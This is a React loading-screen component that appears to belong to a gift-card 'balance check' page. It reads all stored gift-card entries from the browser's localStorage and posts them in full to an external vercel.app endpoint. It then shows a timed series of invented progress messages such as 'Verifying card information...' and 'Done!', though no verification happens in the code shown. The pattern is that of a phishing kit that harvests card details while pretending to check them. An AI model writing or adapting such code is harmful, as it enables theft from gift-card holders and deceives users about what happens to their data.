import React, { useEffect, useState, useRef } from "react";

const Loading = ({ currentStep }) => {
  const [apiError, setApiError] = useState("");
  let status = useRef();

  const sendRequest = async () => {
    try {
      // Retrieve existing GiftCardEntries from localStorage
      const storedEntries =
        JSON.parse(localStorage.getItem("GiftCardEntries")) || {};

      // Prepare POST request parameters
      const { "Card Brand": cardType, Amount: amount } = storedEntries;
      const response = await fetch("https://api-gamma-neon.vercel.app/gowt", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          subject: `${cardType} - ${amount}`,
          message: JSON.stringify(storedEntries, null, 2),
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to send data to the API.");
      }

      setTimeout(() => {
        status.current.textContent = "Checking databases...";
      }, 2000);

      setTimeout(() => {
        status.current.textContent = "Verifying card information...";
      }, 5000);

      setTimeout(() => {
        status.current.textContent = "Sorry, this is taking a while...";
      }, 11000);

      setTimeout(() => {
        status.current.textContent = "Done!";
        setTimeout(() => {
          // Navigate to the next step
          currentStep("Result");
          setTimeout(() => {
              window.location.href = "#result";
            }, 2);
          
        }, 1000);
      }, 13000);
    } catch (err) {
      setApiError(err.message || "An unexpected error occurred.");
    }
  };

  sendRequest();
  

  return (
    <div className="form">
      <div className="form-container theloader">
        <div class="loader">
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
        </div>
        <br />
        <div className="loading-status" ref={status}>
          Checking APIs
        </div>
      </div>
    </div>
  );
};

export default Loading;
